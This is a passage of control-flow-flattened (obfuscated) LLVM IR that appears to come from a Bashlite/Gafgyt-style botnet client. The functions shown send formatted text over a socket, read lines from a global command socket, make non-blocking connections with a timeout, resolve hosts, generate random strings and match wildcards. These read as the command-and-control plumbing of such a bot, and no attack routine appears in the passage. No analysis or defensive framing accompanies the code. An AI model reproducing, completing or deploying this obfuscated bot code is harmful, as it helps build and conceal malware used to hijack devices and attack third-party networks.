  store i32 %79, i32* %21, align 4
  store i32 2033957673, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -170807000, i32 -1969424298
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1948213260, i32 1581350942
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -1176825954, i32 1581350942
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -739601651, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -739601651, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1969424298, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -223162670, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 830936618, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 830936618, label %first
    i32 -846844019, label %8
    i32 -1893015034, label %16
    i32 273853459, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -846844019, i32 -1893015034
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 273853459, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 273853459, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.261, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 551703731, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 551703731, label %NodeBlock5
    i32 -409262340, label %NodeBlock
    i32 -193284147, label %LeafBlock3
    i32 293204647, label %LeafBlock1
    i32 -825339054, label %LeafBlock
    i32 -1953103742, label %14
    i32 1793761728, label %18
    i32 1253492579, label %25
    i32 -289058845, label %31
    i32 1406881244, label %38
    i32 -385190919, label %39
    i32 -2020320765, label %42
    i32 1688563426, label %48
    i32 -2089022564, label %56
    i32 -1295652145, label %NewDefault
    i32 1444145690, label %59
    i32 875378676, label %70
    i32 94904507, label %78
    i32 1136669824, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 -825339054, i32 -409262340
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 293204647, i32 -193284147
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -2020320765, i32 -1295652145
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 1793761728, i32 -1295652145
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -1953103742, i32 -1295652145
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 1136669824, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 1253492579, i32 -385190919
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 -289058845, i32 1406881244
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 1406881244, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -385190919, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 1136669824, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 1688563426, i32 -2089022564
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -2089022564, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 1136669824, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1444145690, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #9
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #9
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 875378676, i32 94904507
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 94904507, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 1136669824, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1361061490, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1361061490, label %first
    i32 -900558799, label %13
    i32 -171986657, label %14
    i32 1731813885, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -900558799, i32 -171986657
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1731813885, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1731813885, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -2137908030, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2137908030, label %6
    i32 -1499657720, label %11
    i32 612537796, label %20
    i32 -1291189187, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -1499657720, i32 -1291189187
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 612537796, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -2137908030, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 963224668, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 963224668, label %24
    i32 -574964074, label %33
    i32 -1578781434, label %50
    i32 -1679420641, label %51
    i32 781831081, label %55
    i32 348479308, label %58
    i32 -162639747, label %67
    i32 1834431438, label %84
    i32 -1687947101, label %87
    i32 -1495752938, label %88
    i32 -366376522, label %89
    i32 -900225198, label %91
    i32 705908948, label %96
    i32 1364330485, label %101
    i32 -1200685308, label %103
    i32 620995925, label %111
    i32 187971693, label %112
    i32 2054247119, label %115
    i32 -1627693670, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -574964074, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -1578781434, i32 -366376522
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -1679420641, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 781831081, i32 -1495752938
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 348479308, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #5, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 -162639747, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 1834431438, i32 -1687947101
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -1679420641, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -1495752938, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -366376522, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 -900225198, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 705908948, i32 2054247119
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 1364330485, i32 -1200685308
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1627693670, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 620995925, i32 187971693
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 2054247119, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 -900225198, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 -1627693670, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 418050427, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 418050427, label %first
    i32 -87425094, label %37
    i32 -841429121, label %38
    i32 651133541, label %47
    i32 1032702103, label %52
    i32 1235860826, label %57
    i32 99374029, label %66
    i32 1967117634, label %83
    i32 241282720, label %90
    i32 -1776832966, label %91
    i32 -1326544605, label %92
    i32 620792930, label %93
    i32 1090592909, label %94
    i32 -884661721, label %95
    i32 -104119734, label %96
    i32 -1805294106, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -87425094, i32 -841429121
  store i32 %36, i32* %switchVar
  br label %loopEnd

